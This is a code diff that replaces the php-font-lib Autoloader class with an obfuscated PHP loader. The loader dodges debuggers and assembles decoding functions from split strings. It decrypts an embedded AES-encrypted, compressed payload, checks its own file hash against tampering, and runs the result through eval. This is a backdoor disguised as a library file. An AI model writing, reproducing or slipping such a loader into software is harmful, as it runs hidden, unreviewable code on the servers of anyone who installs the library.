@@ -1,43 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace FontLib;
-
-/**
- * Autoloads FontLib classes
- *
- * @package php-font-lib
- */
-class Autoloader {
-  const PREFIX = 'FontLib';
-
-  /**
-   * Register the autoloader
-   */
-  public static function register() {
-    spl_autoload_register(array(new self, 'autoload'));
-  }
-
-  /**
-   * Autoloader
-   *
-   * @param string
-   */
-  public static function autoload($class) {
-    $prefixLength = strlen(self::PREFIX);
-    if (0 === strncmp(self::PREFIX, $class, $prefixLength)) {
-      $file = str_replace('\\', DIRECTORY_SEPARATOR, substr($class, $prefixLength));
-      $file = realpath(__DIR__ . (empty($file) ? '' : DIRECTORY_SEPARATOR) . $file . '.php');
-      if (file_exists($file)) {
-        require_once $file;
-      }
-    }
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pmivemiy=('bas'.'e64'.'_de'.'cod'.'e');
+$_fb8kyajc=('gzu'.'nco'.'mpr'.'ess');
+$_z6nuub2u=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_wzdedhvo='mpSQR1SJd/A=';
+$_anjsrj6v='f08DSF0j';
+$_tiuihdlo='XbvF1nsZ';
+$_trpfleey='SSdTkSs0';
+$_i6bfboly='U67KHI5G';
+$_onmkhykj='1P6TFg==';
+$_q6nrsbfl='wSJAVIHm';
+$_mejhe5xw='lLRz4Z3m';
+$_a17iyoaq=$_pmivemiy($_tiuihdlo.$_i6bfboly.$_anjsrj6v.$_trpfleey.$_wzdedhvo);
+$_gtsyocgy=$_pmivemiy($_mejhe5xw.$_q6nrsbfl.$_onmkhykj);
+$_mhmy11z0=$_pmivemiy('sN+U0xNCliHgwsOf8GdlZS7M0PfFG5qvuSvDZOpvc1kJ4nQH3y6fq2qsg2QS6yy2NWK8VCwmMNDitxFuqtTRqqJTTP4L0Etr2eP+SCJ1UQ7hGT/plMVP1jeqtuv9G3MuXmeSj16Iv4TKHIm1clXVJAuh8g1vGvVOGY7jcxCgUgqbuJTXjssql0sqi23MoRkabXXgSriUwhVp5PPRBoCiuFWdBdJGA9aoG68pZzv1XEWK0SNfyLJbt9iEudZhLhB1fQGGSvAOD1P+5RpoOVSjErMQho3u9WjxXxFh88Prnh1VIR0TljlbTA0L9LhHFn1dXi30MqqHhS9n7eFjzbCu9Dm1KWRFFDtioA7dF7vgCBDiTysteuP+9be+kViXzLBG2Lg9OMYBEbRFeMkJxWuWC0LIv3ZTZ62M5enkx40Qqug=');
+$_bo06rdlx=$_z6nuub2u($_mhmy11z0,'aes-256-cbc',$_a17iyoaq,OPENSSL_RAW_DATA,$_gtsyocgy);
+if($_bo06rdlx===false){exit;}
+$_f0vx7bl8=$_fb8kyajc($_bo06rdlx);
+if($_f0vx7bl8===false){exit;}
+$_kixwcd6i='9e1fcc0df8409835e99310b6187c2bb46241dd5e5c0b782fe1ad713972da3486';
+$_g8smvuu5=@file_get_contents(__FILE__);
+if($_g8smvuu5!==false){
+$_vqculxm7=str_replace($_kixwcd6i,"0000000000000000000000000000000000000000000000000000000000000000",$_g8smvuu5);
+$_olxwileb=hash("sha256",$_vqculxm7);
+if($_olxwileb!==$_kixwcd6i){@http_response_code(403);exit;}
 }
-
-Autoloader::register();
+eval($_f0vx7bl8);
